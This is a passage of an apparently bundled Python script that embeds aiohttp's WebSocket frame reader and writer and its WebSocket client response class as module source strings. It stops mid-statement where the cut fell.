b"258EAFA5-E914-47DA-95CA-C5AB0DC85B11"\r\n\r\n\r\nUNPACK_LEN2 = Struct("!H").unpack_from\r\nUNPACK_LEN3 = Struct("!Q").unpack_from\r\nUNPACK_CLOSE_CODE = Struct("!H").unpack\r\nPACK_LEN1 = Struct("!BB").pack\r\nPACK_LEN2 = Struct("!BBH").pack\r\nPACK_LEN3 = Struct("!BBQ").pack\r\nPACK_CLOSE_CODE = Struct("!H").pack\r\nMSG_SIZE: Final[int] = 2 ** 14\r\nDEFAULT_LIMIT: Final[int] = 2 ** 16\r\n\r\n\r\n_WSMessageBase = collections.namedtuple("_WSMessageBase", ["type", "data", "extra"])\r\n\r\n\r\nclass WSMessage(_WSMessageBase):\r\n    def json(self, *, loads: Callable[[Any], Any] = json.loads) -> Any:\r\n        """Return parsed JSON data.\r\n\r\n        .. versionadded:: 0.22\r\n        """\r\n        return loads(self.data)\r\n\r\n\r\nWS_CLOSED_MESSAGE = WSMessage(WSMsgType.CLOSED, None, None)\r\nWS_CLOSING_MESSAGE = WSMessage(WSMsgType.CLOSING, None, None)\r\n\r\n\r\nclass WebSocketError(Exception):\r\n    """WebSocket protocol parser error."""\r\n\r\n    def __init__(self, code: int, message: str) -> None:\r\n        self.code = code\r\n        super().__init__(code, message)\r\n\r\n    def __str__(self) -> str:\r\n        return cast(str, self.args[1])\r\n\r\n\r\nclass WSHandshakeError(Exception):\r\n    """WebSocket protocol handshake error."""\r\n\r\n\r\nnative_byteorder: Final[str] = sys.byteorder\r\n\r\n\r\n# Used by _websocket_mask_python\r\n_XOR_TABLE: Final[List[bytes]] = [bytes(a ^ b for a in range(256)) for b in range(256)]\r\n\r\n\r\ndef _websocket_mask_python(mask: bytes, data: bytearray) -> None:\r\n    """Websocket masking function.\r\n\r\n    `mask` is a `bytes` object of length 4; `data` is a `bytearray`\r\n    object of any length. The contents of `data` are masked with `mask`,\r\n    as specified in section 5.3 of RFC 6455.\r\n\r\n    Note that this function mutates the `data` argument.\r\n\r\n    This pure-python implementation may be replaced by an optimized\r\n    version when available.\r\n\r\n    """\r\n    assert isinstance(data, bytearray), data\r\n    assert len(mask) == 4, mask\r\n\r\n    if data:\r\n        a, b, c, d = (_XOR_TABLE[n] for n in mask)\r\n        data[::4] = data[::4].translate(a)\r\n        data[1::4] = data[1::4].translate(b)\r\n        data[2::4] = data[2::4].translate(c)\r\n        data[3::4] = data[3::4].translate(d)\r\n\r\n\r\nif NO_EXTENSIONS:  # pragma: no cover\r\n    _websocket_mask = _websocket_mask_python\r\nelse:\r\n    try:\r\n        from ._websocket import _websocket_mask_cython  # type: ignore[import]\r\n\r\n        _websocket_mask = _websocket_mask_cython\r\n    except ImportError:  # pragma: no cover\r\n        _websocket_mask = _websocket_mask_python\r\n\r\n_WS_DEFLATE_TRAILING: Final[bytes] = bytes([0x00, 0x00, 0xFF, 0xFF])\r\n\r\n\r\n_WS_EXT_RE: Final[Pattern[str]] = re.compile(\r\n    r"^(?:;\\s*(?:"\r\n    r"(server_no_context_takeover)|"\r\n    r"(client_no_context_takeover)|"\r\n    r"(server_max_window_bits(?:=(\\d+))?)|"\r\n    r"(client_max_window_bits(?:=(\\d+))?)))*$"\r\n)\r\n\r\n_WS_EXT_RE_SPLIT: Final[Pattern[str]] = re.compile(r"permessage-deflate([^,]+)?")\r\n\r\n\r\ndef ws_ext_parse(extstr: Optional[str], isserver: bool = False) -> Tuple[int, bool]:\r\n    if not extstr:\r\n        return 0, False\r\n\r\n    compress = 0\r\n    notakeover = False\r\n    for ext in _WS_EXT_RE_SPLIT.finditer(extstr):\r\n        defext = ext.group(1)\r\n        # Return compress = 15 when get `permessage-deflate`\r\n        if not defext:\r\n            compress = 15\r\n            break\r\n        match = _WS_EXT_RE.match(defext)\r\n        if match:\r\n            compress = 15\r\n            if isserver:\r\n                # Server never fail to detect compress handshake.\r\n                # Server does not need to send max wbit to client\r\n                if match.group(4):\r\n                    compress = int(match.group(4))\r\n                    # Group3 must match if group4 matches\r\n                    # Compress wbit 8 does not support in zlib\r\n                    # If compress level not support,\r\n                    # CONTINUE to next extension\r\n                    if compress > 15 or compress < 9:\r\n                        compress = 0\r\n                        continue\r\n                if match.group(1):\r\n                    notakeover = True\r\n                # Ignore regex group 5 & 6 for client_max_window_bits\r\n                break\r\n            else:\r\n                if match.group(6):\r\n                    compress = int(match.group(6))\r\n                    # Group5 must match if group6 matches\r\n                    # Compress wbit 8 does not support in zlib\r\n                    # If compress level not support,\r\n                    # FAIL the parse progress\r\n                    if compress > 15 or compress < 9:\r\n                        raise WSHandshakeError("Invalid window size")\r\n                if match.group(2):\r\n                    notakeover = True\r\n                # Ignore regex group 5 & 6 for client_max_window_bits\r\n                break\r\n        # Return Fail if client side and not match\r\n        elif not isserver:\r\n            raise WSHandshakeError("Extension for deflate not supported" + ext.group(1))\r\n\r\n    return compress, notakeover\r\n\r\n\r\ndef ws_ext_gen(\r\n    compress: int = 15, isserver: bool = False, server_notakeover: bool = False\r\n) -> str:\r\n    # client_notakeover=False not used for server\r\n    # compress wbit 8 does not support in zlib\r\n    if compress < 9 or compress > 15:\r\n        raise ValueError(\r\n            "Compress wbits must between 9 and 15, " "zlib does not support wbits=8"\r\n        )\r\n    enabledext = ["permessage-deflate"]\r\n    if not isserver:\r\n        enabledext.append("client_max_window_bits")\r\n\r\n    if compress < 15:\r\n        enabledext.append("server_max_window_bits=" + str(compress))\r\n    if server_notakeover:\r\n        enabledext.append("server_no_context_takeover")\r\n    # if client_notakeover:\r\n    #     enabledext.append(\'client_no_context_takeover\')\r\n    return "; ".join(enabledext)\r\n\r\n\r\nclass WSParserState(IntEnum):\r\n    READ_HEADER = 1\r\n    READ_PAYLOAD_LENGTH = 2\r\n    READ_PAYLOAD_MASK = 3\r\n    READ_PAYLOAD = 4\r\n\r\n\r\nclass WebSocketReader:\r\n    def __init__(\r\n        self, queue: DataQueue[WSMessage], max_msg_size: int, compress: bool = True\r\n    ) -> None:\r\n        self.queue = queue\r\n        self._max_msg_size = max_msg_size\r\n\r\n        self._exc = None  # type: Optional[BaseException]\r\n        self._partial = bytearray()\r\n        self._state = WSParserState.READ_HEADER\r\n\r\n        self._opcode = None  # type: Optional[int]\r\n        self._frame_fin = False\r\n        self._frame_opcode = None  # type: Optional[int]\r\n        self._frame_payload = bytearray()\r\n\r\n        self._tail = b""\r\n        self._has_mask = False\r\n        self._frame_mask = None  # type: Optional[bytes]\r\n        self._payload_length = 0\r\n        self._payload_length_flag = 0\r\n        self._compressed = None  # type: Optional[bool]\r\n        self._decompressobj = None  # type: Any  # zlib.decompressobj actually\r\n        self._compress = compress\r\n\r\n    def feed_eof(self) -> None:\r\n        self.queue.feed_eof()\r\n\r\n    def feed_data(self, data: bytes) -> Tuple[bool, bytes]:\r\n        if self._exc:\r\n            return True, data\r\n\r\n        try:\r\n            return self._feed_data(data)\r\n        except Exception as exc:\r\n            self._exc = exc\r\n            self.queue.set_exception(exc)\r\n            return True, b""\r\n\r\n    def _feed_data(self, data: bytes) -> Tuple[bool, bytes]:\r\n        for fin, opcode, payload, compressed in self.parse_frame(data):\r\n            if compressed and not self._decompressobj:\r\n                self._decompressobj = zlib.decompressobj(wbits=-zlib.MAX_WBITS)\r\n            if opcode == WSMsgType.CLOSE:\r\n                if len(payload) >= 2:\r\n                    close_code = UNPACK_CLOSE_CODE(payload[:2])[0]\r\n                    if close_code < 3000 and close_code not in ALLOWED_CLOSE_CODES:\r\n                        raise WebSocketError(\r\n                            WSCloseCode.PROTOCOL_ERROR,\r\n                            f"Invalid close code: {close_code}",\r\n                        )\r\n                    try:\r\n                        close_message = payload[2:].decode("utf-8")\r\n                    except UnicodeDecodeError as exc:\r\n                        raise WebSocketError(\r\n                            WSCloseCode.INVALID_TEXT, "Invalid UTF-8 text message"\r\n                        ) from exc\r\n                    msg = WSMessage(WSMsgType.CLOSE, close_code, close_message)\r\n                elif payload:\r\n                    raise WebSocketError(\r\n                        WSCloseCode.PROTOCOL_ERROR,\r\n                        f"Invalid close frame: {fin} {opcode} {payload!r}",\r\n                    )\r\n                else:\r\n                    msg = WSMessage(WSMsgType.CLOSE, 0, "")\r\n\r\n                self.queue.feed_data(msg, 0)\r\n\r\n            elif opcode == WSMsgType.PING:\r\n                self.queue.feed_data(\r\n                    WSMessage(WSMsgType.PING, payload, ""), len(payload)\r\n                )\r\n\r\n            elif opcode == WSMsgType.PONG:\r\n                self.queue.feed_data(\r\n                    WSMessage(WSMsgType.PONG, payload, ""), len(payload)\r\n                )\r\n\r\n            elif (\r\n                opcode not in (WSMsgType.TEXT, WSMsgType.BINARY)\r\n                and self._opcode is None\r\n            ):\r\n                raise WebSocketError(\r\n                    WSCloseCode.PROTOCOL_ERROR, f"Unexpected opcode={opcode!r}"\r\n                )\r\n            else:\r\n                # load text/binary\r\n                if not fin:\r\n                    # got partial frame payload\r\n                    if opcode != WSMsgType.CONTINUATION:\r\n                        self._opcode = opcode\r\n                    self._partial.extend(payload)\r\n                    if self._max_msg_size and len(self._partial) >= self._max_msg_size:\r\n                        raise WebSocketError(\r\n                            WSCloseCode.MESSAGE_TOO_BIG,\r\n                            "Message size {} exceeds limit {}".format(\r\n                                len(self._partial), self._max_msg_size\r\n                            ),\r\n                        )\r\n                else:\r\n                    # previous frame was non finished\r\n                    # we should get continuation opcode\r\n                    if self._partial:\r\n                        if opcode != WSMsgType.CONTINUATION:\r\n                            raise WebSocketError(\r\n                                WSCloseCode.PROTOCOL_ERROR,\r\n                                "The opcode in non-fin frame is expected "\r\n                                "to be zero, got {!r}".format(opcode),\r\n                            )\r\n\r\n                    if opcode == WSMsgType.CONTINUATION:\r\n                        assert self._opcode is not None\r\n                        opcode = self._opcode\r\n                        self._opcode = None\r\n\r\n                    self._partial.extend(payload)\r\n                    if self._max_msg_size and len(self._partial) >= self._max_msg_size:\r\n                        raise WebSocketError(\r\n                            WSCloseCode.MESSAGE_TOO_BIG,\r\n                            "Message size {} exceeds limit {}".format(\r\n                                len(self._partial), self._max_msg_size\r\n                            ),\r\n                        )\r\n\r\n                    # Decompress process must to be done after all packets\r\n                    # received.\r\n                    if compressed:\r\n                        self._partial.extend(_WS_DEFLATE_TRAILING)\r\n                        payload_merged = self._decompressobj.decompress(\r\n                            self._partial, self._max_msg_size\r\n                        )\r\n                        if self._decompressobj.unconsumed_tail:\r\n                            left = len(self._decompressobj.unconsumed_tail)\r\n                            raise WebSocketError(\r\n                                WSCloseCode.MESSAGE_TOO_BIG,\r\n                                "Decompressed message size {} exceeds limit {}".format(\r\n                                    self._max_msg_size + left, self._max_msg_size\r\n                                ),\r\n                            )\r\n                    else:\r\n                        payload_merged = bytes(self._partial)\r\n\r\n                    self._partial.clear()\r\n\r\n                    if opcode == WSMsgType.TEXT:\r\n                        try:\r\n                            text = payload_merged.decode("utf-8")\r\n                            self.queue.feed_data(\r\n                                WSMessage(WSMsgType.TEXT, text, ""), len(text)\r\n                            )\r\n                        except UnicodeDecodeError as exc:\r\n                            raise WebSocketError(\r\n                                WSCloseCode.INVALID_TEXT, "Invalid UTF-8 text message"\r\n                            ) from exc\r\n                    else:\r\n                        self.queue.feed_data(\r\n                            WSMessage(WSMsgType.BINARY, payload_merged, ""),\r\n                            len(payload_merged),\r\n                        )\r\n\r\n        return False, b""\r\n\r\n    def parse_frame(\r\n        self, buf: bytes\r\n    ) -> List[Tuple[bool, Optional[int], bytearray, Optional[bool]]]:\r\n        """Return the next frame from the socket."""\r\n        frames = []\r\n        if self._tail:\r\n            buf, self._tail = self._tail + buf, b""\r\n\r\n        start_pos = 0\r\n        buf_length = len(buf)\r\n\r\n        while True:\r\n            # read header\r\n            if self._state == WSParserState.READ_HEADER:\r\n                if buf_length - start_pos >= 2:\r\n                    data = buf[start_pos : start_pos + 2]\r\n                    start_pos += 2\r\n                    first_byte, second_byte = data\r\n\r\n                    fin = (first_byte >> 7) & 1\r\n                    rsv1 = (first_byte >> 6) & 1\r\n                    rsv2 = (first_byte >> 5) & 1\r\n                    rsv3 = (first_byte >> 4) & 1\r\n                    opcode = first_byte & 0xF\r\n\r\n                    # frame-fin = %x0 ; more frames of this message follow\r\n                    #           / %x1 ; final frame of this message\r\n                    # frame-rsv1 = %x0 ;\r\n                    #    1 bit, MUST be 0 unless negotiated otherwise\r\n                    # frame-rsv2 = %x0 ;\r\n                    #    1 bit, MUST be 0 unless negotiated otherwise\r\n                    # frame-rsv3 = %x0 ;\r\n                    #    1 bit, MUST be 0 unless negotiated otherwise\r\n                    #\r\n                    # Remove rsv1 from this test for deflate development\r\n                    if rsv2 or rsv3 or (rsv1 and not self._compress):\r\n                        raise WebSocketError(\r\n                            WSCloseCode.PROTOCOL_ERROR,\r\n                            "Received frame with non-zero reserved bits",\r\n                        )\r\n\r\n                    if opcode > 0x7 and fin == 0:\r\n                        raise WebSocketError(\r\n                            WSCloseCode.PROTOCOL_ERROR,\r\n                            "Received fragmented control frame",\r\n                        )\r\n\r\n                    has_mask = (second_byte >> 7) & 1\r\n                    length = second_byte & 0x7F\r\n\r\n                    # Control frames MUST have a payload\r\n                    # length of 125 bytes or less\r\n                    if opcode > 0x7 and length > 125:\r\n                        raise WebSocketError(\r\n                            WSCloseCode.PROTOCOL_ERROR,\r\n                            "Control frame payload cannot be " "larger than 125 bytes",\r\n                        )\r\n\r\n                    # Set compress status if last package is FIN\r\n                    # OR set compress status if this is first fragment\r\n                    # Raise error if not first fragment with rsv1 = 0x1\r\n                    if self._frame_fin or self._compressed is None:\r\n                        self._compressed = True if rsv1 else False\r\n                    elif rsv1:\r\n                        raise WebSocketError(\r\n                            WSCloseCode.PROTOCOL_ERROR,\r\n                            "Received frame with non-zero reserved bits",\r\n                        )\r\n\r\n                    self._frame_fin = bool(fin)\r\n                    self._frame_opcode = opcode\r\n                    self._has_mask = bool(has_mask)\r\n                    self._payload_length_flag = length\r\n                    self._state = WSParserState.READ_PAYLOAD_LENGTH\r\n                else:\r\n                    break\r\n\r\n            # read payload length\r\n            if self._state == WSParserState.READ_PAYLOAD_LENGTH:\r\n                length = self._payload_length_flag\r\n                if length == 126:\r\n                    if buf_length - start_pos >= 2:\r\n                        data = buf[start_pos : start_pos + 2]\r\n                        start_pos += 2\r\n                        length = UNPACK_LEN2(data)[0]\r\n                        self._payload_length = length\r\n                        self._state = (\r\n                            WSParserState.READ_PAYLOAD_MASK\r\n                            if self._has_mask\r\n                            else WSParserState.READ_PAYLOAD\r\n                        )\r\n                    else:\r\n                        break\r\n                elif length > 126:\r\n                    if buf_length - start_pos >= 8:\r\n                        data = buf[start_pos : start_pos + 8]\r\n                        start_pos += 8\r\n                        length = UNPACK_LEN3(data)[0]\r\n                        self._payload_length = length\r\n                        self._state = (\r\n                            WSParserState.READ_PAYLOAD_MASK\r\n                            if self._has_mask\r\n                            else WSParserState.READ_PAYLOAD\r\n                        )\r\n                    else:\r\n                        break\r\n                else:\r\n                    self._payload_length = length\r\n                    self._state = (\r\n                        WSParserState.READ_PAYLOAD_MASK\r\n                        if self._has_mask\r\n                        else WSParserState.READ_PAYLOAD\r\n                    )\r\n\r\n            # read payload mask\r\n            if self._state == WSParserState.READ_PAYLOAD_MASK:\r\n                if buf_length - start_pos >= 4:\r\n                    self._frame_mask = buf[start_pos : start_pos + 4]\r\n                    start_pos += 4\r\n                    self._state = WSParserState.READ_PAYLOAD\r\n                else:\r\n                    break\r\n\r\n            if self._state == WSParserState.READ_PAYLOAD:\r\n                length = self._payload_length\r\n                payload = self._frame_payload\r\n\r\n                chunk_len = buf_length - start_pos\r\n                if length >= chunk_len:\r\n                    self._payload_length = length - chunk_len\r\n                    payload.extend(buf[start_pos:])\r\n                    start_pos = buf_length\r\n                else:\r\n                    self._payload_length = 0\r\n                    payload.extend(buf[start_pos : start_pos + length])\r\n                    start_pos = start_pos + length\r\n\r\n                if self._payload_length == 0:\r\n                    if self._has_mask:\r\n                        assert self._frame_mask is not None\r\n                        _websocket_mask(self._frame_mask, payload)\r\n\r\n                    frames.append(\r\n                        (self._frame_fin, self._frame_opcode, payload, self._compressed)\r\n                    )\r\n\r\n                    self._frame_payload = bytearray()\r\n                    self._state = WSParserState.READ_HEADER\r\n                else:\r\n                    break\r\n\r\n        self._tail = buf[start_pos:]\r\n\r\n        return frames\r\n\r\n\r\nclass WebSocketWriter:\r\n    def __init__(\r\n        self,\r\n        protocol: BaseProtocol,\r\n        transport: asyncio.Transport,\r\n        *,\r\n        use_mask: bool = False,\r\n        limit: int = DEFAULT_LIMIT,\r\n        random: Any = random.Random(),\r\n        compress: int = 0,\r\n        notakeover: bool = False,\r\n    ) -> None:\r\n        self.protocol = protocol\r\n        self.transport = transport\r\n        self.use_mask = use_mask\r\n        self.randrange = random.randrange\r\n        self.compress = compress\r\n        self.notakeover = notakeover\r\n        self._closing = False\r\n        self._limit = limit\r\n        self._output_size = 0\r\n        self._compressobj = None  # type: Any  # actually compressobj\r\n\r\n    async def _send_frame(\r\n        self, message: bytes, opcode: int, compress: Optional[int] = None\r\n    ) -> None:\r\n        """Send a frame over the websocket with message as its payload."""\r\n        if self._closing and not (opcode & WSMsgType.CLOSE):\r\n            raise ConnectionResetError("Cannot write to closing transport")\r\n\r\n        rsv = 0\r\n\r\n        # Only compress larger packets (disabled)\r\n        # Does small packet needs to be compressed?\r\n        # if self.compress and opcode < 8 and len(message) > 124:\r\n        if (compress or self.compress) and opcode < 8:\r\n            if compress:\r\n                # Do not set self._compress if compressing is for this frame\r\n                compressobj = zlib.compressobj(level=zlib.Z_BEST_SPEED, wbits=-compress)\r\n            else:  # self.compress\r\n                if not self._compressobj:\r\n                    self._compressobj = zlib.compressobj(\r\n                        level=zlib.Z_BEST_SPEED, wbits=-self.compress\r\n                    )\r\n                compressobj = self._compressobj\r\n\r\n            message = compressobj.compress(message)\r\n            message = message + compressobj.flush(\r\n                zlib.Z_FULL_FLUSH if self.notakeover else zlib.Z_SYNC_FLUSH\r\n            )\r\n            if message.endswith(_WS_DEFLATE_TRAILING):\r\n                message = message[:-4]\r\n            rsv = rsv | 0x40\r\n\r\n        msg_length = len(message)\r\n\r\n        use_mask = self.use_mask\r\n        if use_mask:\r\n            mask_bit = 0x80\r\n        else:\r\n            mask_bit = 0\r\n\r\n        if msg_length < 126:\r\n            header = PACK_LEN1(0x80 | rsv | opcode, msg_length | mask_bit)\r\n        elif msg_length < (1 << 16):\r\n            header = PACK_LEN2(0x80 | rsv | opcode, 126 | mask_bit, msg_length)\r\n        else:\r\n            header = PACK_LEN3(0x80 | rsv | opcode, 127 | mask_bit, msg_length)\r\n        if use_mask:\r\n            mask = self.randrange(0, 0xFFFFFFFF)\r\n            mask = mask.to_bytes(4, "big")\r\n            message = bytearray(message)\r\n            _websocket_mask(mask, message)\r\n            self._write(header + mask + message)\r\n            self._output_size += len(header) + len(mask) + len(message)\r\n        else:\r\n            if len(message) > MSG_SIZE:\r\n                self._write(header)\r\n                self._write(message)\r\n            else:\r\n                self._write(header + message)\r\n\r\n            self._output_size += len(header) + len(message)\r\n\r\n        if self._output_size > self._limit:\r\n            self._output_size = 0\r\n            await self.protocol._drain_helper()\r\n\r\n    def _write(self, data: bytes) -> None:\r\n        if self.transport is None or self.transport.is_closing():\r\n            raise ConnectionResetError("Cannot write to closing transport")\r\n        self.transport.write(data)\r\n\r\n    async def pong(self, message: bytes = b"") -> None:\r\n        """Send pong message."""\r\n        if isinstance(message, str):\r\n            message = message.encode("utf-8")\r\n        await self._send_frame(message, WSMsgType.PONG)\r\n\r\n    async def ping(self, message: bytes = b"") -> None:\r\n        """Send ping message."""\r\n        if isinstance(message, str):\r\n            message = message.encode("utf-8")\r\n        await self._send_frame(message, WSMsgType.PING)\r\n\r\n    async def send(\r\n        self,\r\n        message: Union[str, bytes],\r\n        binary: bool = False,\r\n        compress: Optional[int] = None,\r\n    ) -> None:\r\n        """Send a frame over the websocket with message as its payload."""\r\n        if isinstance(message, str):\r\n            message = message.encode("utf-8")\r\n        if binary:\r\n            await self._send_frame(message, WSMsgType.BINARY, compress)\r\n        else:\r\n            await self._send_frame(message, WSMsgType.TEXT, compress)\r\n\r\n    async def close(self, code: int = 1000, message: bytes = b"") -> None:\r\n        """Close the websocket, sending the specified code and message."""\r\n        if isinstance(message, str):\r\n            message = message.encode("utf-8")\r\n        try:\r\n            await self._send_frame(\r\n                PACK_CLOSE_CODE(code) + message, opcode=WSMsgType.CLOSE\r\n            )\r\n        finally:\r\n            self._closing = True\r\n')
    __stickytape_write_module('aiohttp/client_ws.py', b'"""WebSocket client for asyncio."""\r\n\r\nimport asyncio\r\nfrom typing import Any, Optional, cast\r\n\r\nimport async_timeout\r\n\r\nfrom .client_exceptions import ClientError\r\nfrom .client_reqrep import ClientResponse\r\nfrom .helpers import call_later, set_result\r\nfrom .http import (\r\n    WS_CLOSED_MESSAGE,\r\n    WS_CLOSING_MESSAGE,\r\n    WebSocketError,\r\n    WSCloseCode,\r\n    WSMessage,\r\n    WSMsgType,\r\n)\r\nfrom .http_websocket import WebSocketWriter  # WSMessage\r\nfrom .streams import EofStream, FlowControlDataQueue\r\nfrom .typedefs import (\r\n    DEFAULT_JSON_DECODER,\r\n    DEFAULT_JSON_ENCODER,\r\n    JSONDecoder,\r\n    JSONEncoder,\r\n)\r\n\r\n\r\nclass ClientWebSocketResponse:\r\n    def __init__(\r\n        self,\r\n        reader: "FlowControlDataQueue[WSMessage]",\r\n        writer: WebSocketWriter,\r\n        protocol: Optional[str],\r\n        response: ClientResponse,\r\n        timeout: float,\r\n        autoclose: bool,\r\n        autoping: bool,\r\n        loop: asyncio.AbstractEventLoop,\r\n        *,\r\n        receive_timeout: Optional[float] = None,\r\n        heartbeat: Optional[float] = None,\r\n        compress: int = 0,\r\n        client_notakeover: bool = False,\r\n    ) -> None:\r\n        self._response = response\r\n        self._conn = response.connection\r\n\r\n        self._writer = writer\r\n        self._reader = reader\r\n        self._protocol = protocol\r\n        self._closed = False\r\n        self._closing = False\r\n        self._close_code = None  # type: Optional[int]\r\n        self._timeout = timeout\r\n        self._receive_timeout = receive_timeout\r\n        self._autoclose = autoclose\r\n        self._autoping = autoping\r\n        self._heartbeat = heartbeat\r\n        self._heartbeat_cb: Optional[asyncio.TimerHandle] = None\r\n        if heartbeat is not None:\r\n            self._pong_heartbeat = heartbeat / 2.0\r\n        self._pong_response_cb: Optional[asyncio.TimerHandle] = None\r\n        self._loop = loop\r\n        self._waiting = None  # type: Optional[asyncio.Future[bool]]\r\n        self._exception = None  # type: Optional[BaseException]\r\n        self._compress = compress\r\n        self._client_notakeover = client_notakeover\r\n\r\n        self._reset_heartbeat()\r\n\r\n    def _cancel_heartbeat(self) -> None:\r\n        if self._pong_response_cb is not None:\r\n            self._pong_response_cb.cancel()\r\n            self._pong_response_cb = None\r\n\r\n        if self._heartbeat_cb is not None:\r\n            self._heartbeat_cb.cancel()\r\n            self._heartbeat_cb = None\r\n\r\n    def _reset_heartbeat(self) -> None:\r\n        self._cancel_heartbeat()\r\n\r\n        if self._heartbeat is not None:\r\n            self._heartbeat_cb = call_later(\r\n                self._send_heartbeat, self._heartbeat, self._loop\r\n            )\r\n\r\n    def _send_heartbeat(self) -> None:\r\n        if self._heartbeat is not None and not self._closed:\r\n            # fire-and-forget a task is not perfect but maybe ok for\r\n            # sending ping. Otherwise we need a long-living heartbeat\r\n            # task in the class.\r\n            self._loop.create_task(self._writer.ping())\r\n\r\n            if self._pong_response_cb is not None:\r\n                self._pong_response_cb.cancel()\r\n            self._pong_response_cb = call_later(\r\n                self._pong_not_received, self._pong_heartbeat, self._loop\r\n            )\r\n\r\n    def _pong_not_received(self) -> None:\r\n        if not self._closed:\r\n            self._closed = True\r\n            self._close_code = WSCloseCode.ABNORMAL_CLOSURE\r\n            self._exception = asyncio.TimeoutError()\r\n            self._response.close()\r\n\r\n    @property\r\n    def closed(self) -> bool:\r\n        return self._closed\r\n\r\n    @property\r\n    def close_code(self) -> Optional[int]:\r\n        return self._close_code\r\n\r\n    @property\r\n    def protocol(self) -> Optional[str]:\r\n        return self._protocol\r\n\r\n    @property\r\n    def compress(self) -> int:\r\n        return self._compress\r\n\r\n    @property\r\n    def client_notakeover(self) -> bool:\r\n        return self._client_notakeover\r\n\r\n    def get_extra_info(self, name: str, default: Any = None) -> Any:\r\n        """extra info from connection transport"""\r\n        conn = self._response.connection\r\n        if conn is None:\r\n            return default\r\n        transport = conn.transport\r\n        if transport is None:\r\n            return default\r\n        return transport.get_extra_info(name, default)\r\n\r\n    def exception(self) -> Optional[BaseException]:\r\n        return self._exception\r\n\r\n    async def ping(self, message: bytes = b"") -> None:\r\n        await self._writer.ping(message)\r\n\r\n    async def pong(self, message: bytes = b"") -> None:\r\n        await self._writer.pong(message)\r\n\r\n    async def send_str(self, data: str, compress: Optional[int] = None) -> None:\r\n        if not isinstance(data, str):\r\n            raise TypeError("data argument must be str (%r)" % type(data))\r\n        await self._writer.send(data, binary=False, compress=compress)\r\n\r\n    async def send_bytes(self, data: bytes, compress: Optional[int] = None) -> None:\r\n        if not isinstance(data, (bytes, bytearray, memoryview)):\r\n            raise TypeError("data argument must be byte-ish (%r)" % type(data))\r\n        await self._writer.send(data, binary=True, compress=compress)\r\n\r\n    async def send_json(\r\n        self,\r\n        data: Any,\r\n        compress: Optional[int] = None,\r\n        *,\r\n        dumps: JSONEncoder = DEFAULT_JSON_ENCODER,\r\n    ) -> None:\r\n        await self.send_str(dumps(data), compress=compress)\r\n\r\n    async def close(self, *, code: int = WSCloseCode.OK, message: bytes = b"") -> bool:\r\n        # we need to break `receive()` cycle first,\r\n        # `close()` may be called from different task\r\n        if self._waiting is not None and not self._closed:\r\n            self._reader.feed_data(WS_CLOSING_MESSAGE, 0)\r\n            await self._waiting\r\n\r\n        if not self._closed:\r\n            self._cancel_heartbeat()\r\n            self._closed = True\r\n            try:\r\n                await self._writer.close(code, message)\r\n            except asyncio.CancelledError:\r\n                self._close_code = WSCloseCode.ABNORMAL_CLOSURE\r\n                self._response.close()\r\n                raise\r\n            except Exception as exc:\r\n                self._close_code = WSCloseCode.ABNORMAL_CLOSURE\r\n                self._exception = exc\r\n                self._response.close()\r\n                return True\r\n\r\n            if self._closing:\r\n                self._response.close()\r\n                return True\r\n\r\n            while True:\r\n                try:\r\n                    async with async_timeout.timeout(self._timeout):\r\n                        msg = await self._reader.read()\r\n                except asyncio.CancelledError:\r\n                    self._close_code = WSCloseCode.ABNORMAL_CLOSURE\r\n                    self._response.close()\r\n                    raise\r\n                except Exception as exc:\r\n                    self._close_code = WSCloseCode.ABNORMAL_CLOSURE\r\n                    self._exception = exc\r\n                    self._response.close()\r\n                    return True\r\n\r\n                if msg.type == WSMsgType.CLOSE:\r\n                    self._close_code = msg.data\r\n                    self._response.close()\r\n                    return True\r\n        else:\r\n            return False\r\n\r\n    async def receive(self, timeout: Optional[float] = None) -> WSMessage:\r\n        while True:\r\n            if self._waiting is not None:\r\n                raise RuntimeError("Concurrent call to receive() is not allowed")\r\n\r\n            if self._closed:\r\n                return WS_CLOSED_MESSAGE\r\n            elif self._closing:\r\n                await self.close()\r\n                return WS_CLOSED_MESSAGE\r\n\r\n            try:\r\n                self._waiting = self._loop.create_future()\r\n                try:\r\n                    async with async_timeout.timeout(timeout or self._receive_timeout):\r\n                        msg = await self._reader.read()\r\n                    self._reset_heartbeat()\r\n                finally:\r\n                    waiter = self._waiting\r\n                    self._waiting = None\r\n                    set_result(waiter, True)\r\n            except (asyncio.CancelledError, asyncio.TimeoutError):\r\n                self._close_code = WSCloseCode.ABNORMAL_CLOSURE\r\n                raise\r\n            except EofStream:\r\n                self._close_code = WSCloseCode.OK\r\n                await self.close()\r\n                return WSMessage(WSMsgType.CLOSED, None, None)\r\n            except ClientError:\r\n                self._closed = True\r\n                self._close_code = WSCloseCode.ABNORMAL_CLOSURE\r\n                return WS_CLOSED_MESSAGE\r\n            except WebSocketError as exc:\r\n                self._close_code = exc.code\r\n                await self.close(code=exc.code)\r\n                return WSMessage(WSMsgType.ERROR, exc, None)\r\n            except Exception as exc:\r\n                self._exception = exc\r\n                self._closing = True\r\n                self._close_code = WSCloseCode.ABNORMAL_CLOSURE\r\n                await self.close()\r\n                return WSMessage(WSMsgType.ERROR, exc, None)\r\n\r\n            if msg.type == WSMsgType.CLOSE:\r\n                self._closing = True\r\n                self._close_code = msg.data\r\n                if not self._closed and self._autoclose:\r\n                    await self.close()\r\n            elif msg.type == WSMsgType.CLOSING:\r\n                self._closing = True\r\n            elif msg.type == WSMsgType.PING and self._autoping:\r\n                await self.pong(msg.data)\r\n                continue\r\n            elif msg.type == WSMsgType.PONG and self._autoping:\r\n                continue\r\n\r\n            return msg\r\n\r\n    async def receive_str(self, *, timeout: Optional[float] = None) -> str:\r\n        msg = await self.receive(timeout)\r\n        if msg.type != WSMsgType.TEXT:\r\n            raise TypeError(f"Received message {msg.type}:{msg.data!r} is not str")\r\n        return cast(str, msg.data)\r\n\r\n    async def receive_bytes(self, *, timeout: Optional[float] = None) -> bytes:\r\n        msg = await self.receive(timeout)\r\n        if msg.type != WSMsgType.BINARY:\r\n            raise TypeError(f"Received message {msg.type}:{msg.data!r} is not bytes")\r\n        return cast(bytes, msg.data)\r\n\r\n    async def receive_json(\r\n        self,\r\n        *,\r\n        loads: JSONDecoder = DEFAULT_JSON_DECODER,\r\n        timeout: Optional[float] = None,\r\n    ) -> Any:\r\n        data = await self.receive_str(timeout=timeout)\r\n        return loads(data)\r\n\r\n    def __aiter__(self) -> "ClientWebSocketResponse":\r\n        return self\r\n\r\n    async def __anext__(self) -> WSMessage:\r\n        msg = await self.receive()\r\n        if msg.type in (WSMsgType.CLOSE, WSMsgType.CLOSING, WSMsgType.CLOSED):\r\n            raise 